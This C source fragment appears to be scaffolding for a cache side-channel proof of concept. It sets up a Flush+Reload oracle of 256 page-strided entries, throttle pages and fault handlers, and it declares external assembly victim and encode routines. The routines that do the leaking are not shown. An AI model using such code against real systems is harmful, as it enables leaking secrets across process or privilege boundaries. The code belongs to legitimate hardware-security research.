
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <time.h>
#include <signal.h>
#include <setjmp.h>
#include <pthread.h>
#include <sched.h>
#include <sys/mman.h>

#include "lib.h"
#include "config.h"
#include "./cacheutils.h"

#define PAGE_SIZE 4096
#define CACHE_SIZE 64


uint8_t  __attribute__((aligned(PAGE_SIZE))) throttle[8 * 4096];

/* see asm.S */

extern uint64_t CACHE_THRESHOLD;
extern uint8_t * address_normal;
extern uint8_t * oracles;
extern uint8_t * source;
extern uint8_t * dest;


extern void s_load_encode(uint32_t * perm, uint32_t * index);
extern void victim_asm();


void setup_throttle()
{
    for (int i = 0; i < 8; i++) {
        throttle[i * 4096] = 1;
    }
}

 #define VICTIM_ROUTINE() victim_asm();

void setup_oracle(){
    CACHE_MISS = detect_flush_reload_threshold(); 
    for(int i = 0; i < 256; i++){
        flush((uint8_t *)&oracles + i * PAGE_SIZE);
    }
}


void setup_fh(){
    signal(SIGSEGV, trycatch_segfault_handler);
    signal(SIGFPE, trycatch_segfault_handler);
}
